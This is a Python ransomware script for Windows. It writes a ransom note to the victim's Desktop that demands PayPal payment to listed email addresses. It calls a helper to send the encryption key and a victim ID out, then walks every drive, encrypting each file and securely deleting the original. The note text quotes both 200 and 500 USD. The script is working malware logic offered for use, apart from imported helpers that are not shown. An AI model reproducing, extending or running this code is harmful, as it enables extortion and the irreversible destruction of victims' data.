import uuid
import os
from pathlib import Path

from utils.list_files import list_windows_files
from utils.crypt import generate_key, generate_random_secret_string, encrypt_file
from utils.delete import secure_delete
from utils.notify import send_information
from utils.drivers import list_drives

# Define the setup before everything
passphrase = generate_random_secret_string()
key = generate_key(passphrase)

uuid = str(uuid.uuid4())
desktop_path = Path(os.environ['USERPROFILE'], 'Desktop')

# For safety, Just in-case I encrypt my C: drive by mistake I can know the key to decrypt it
# print(key)

def main() -> None:
    # Create a README.md in the desktop, send the information before everything in-case the 
    # encryption didn't finish or got interupted, some files would get encrypted on the way 
    # and the victim might contact you to decrypt them 
    file_path = desktop_path / "README.txt"

    with open(file_path, 'w') as file:
        file.write(f'''
IMPORTANT NOTICE: YOUR FILES HAVE BEEN ENCRYPTED

Hello,

We regret to inform you that your data has been securely encrypted. To regain access to your files, a payment of 200 USD is required. Please follow the instructions below carefully to ensure a smooth recovery process:

Payment Details:

Amount: 500 USD
Method: Send the payment via PayPal
PayPal Address: mdaif1332@outlook.com
Contact After Payment:

Once the payment has been made, please contact us at mdaif1332@gmail.com with your unique ID (provided below). This is essential to verify your payment and to provide you with the decryption key.
Your Unique ID: {uuid}

Please note that attempting to decrypt your files on your own or seeking help from third parties may lead to permanent data loss. Once we confirm your payment based on the UUID provided, we will promptly send you the decryption key.

We understand this may be distressing and appreciate your cooperation to resolve this swiftly.
''')
        
    send_information(key=key, uuid=uuid)

    # 1st step, listing files and encrypting them in paralel
    drivers = list_drives()
    for driver in drivers:
        for path in list_windows_files(directory_path=driver):
            # 2nd step
            print(path)
            encrypt_file(path, key)
            secure_delete(path)

if __name__ == "__main__":
    main()